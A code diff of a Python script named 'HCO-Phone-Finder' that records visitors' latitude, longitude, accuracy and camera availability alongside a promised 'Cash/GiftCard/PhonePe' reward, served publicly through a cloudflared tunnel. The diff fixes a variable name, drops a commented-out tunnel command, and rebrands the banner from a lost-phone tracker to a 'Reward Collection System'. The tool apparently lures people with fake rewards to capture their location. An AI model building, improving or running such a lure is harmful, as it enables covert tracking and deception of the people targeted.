@@ -294,7 +294,7 @@ def report():
         "lat": float(lat),
         "lon": float(lon),
         "acc": acc,
-        "has_camera": hasCamera,
+        "has_camera": has_camera,  # Fixed variable name
         "reward_type": "Cash/GiftCard/PhonePe"
     }
     _received_reports.append(rec)
@@ -403,12 +403,6 @@ def start_cloudflared_background(port: int = PORT, timeout: float = 12.0) -> Tup
             "--url", f"http://localhost:{port}"
         ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
         
-        # Alternative command if above doesn't work
-        # proc = subprocess.Popen([
-        #     "cloudflared", "tunnel", "run",
-        #     "--url", f"http://localhost:{port}"
-        # ], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-        
     except Exception as e:
         print(Fore.RED + "[!] Failed to start cloudflared:", e)
         return None, None
@@ -494,11 +488,11 @@ def tool_lock_countdown(seconds: int = 5):
     print("\n" + Fore.GREEN + "Tool unlocked — starting now.\n")
 
 def print_banner():
-    print(Style.Green + Fore.CYAN + "╔══════════════════════════════════════╗")
-    print(Style.Green + Fore.CYAN + "║             HCO-Phone-Finder by Azhar       ║")
-    print(Style.Green + Fore.CYAN + "║      Tool to Track Lost or Stolen Phone 📱  ║")
-    print(Style.Green + Fore.CYAN + "╚══════════════════════════════════════╝")
-    print(Fore.Red + "Code by Azhar — Advanced reward collection system\n")
+    print(Style.BRIGHT + Fore.CYAN + "╔══════════════════════════════════════╗")
+    print(Style.BRIGHT + Fore.CYAN + "║       HCO-Phone-Finder v3           ║")
+    print(Style.BRIGHT + Fore.CYAN + "║      Reward Collection System        ║")
+    print(Style.BRIGHT + Fore.CYAN + "╚══════════════════════════════════════╝")
+    print(Fore.MAGENTA + "Code by Azhar — Advanced reward collection system\n")
 
 # ----------------- Main flow -----------------
 def main():
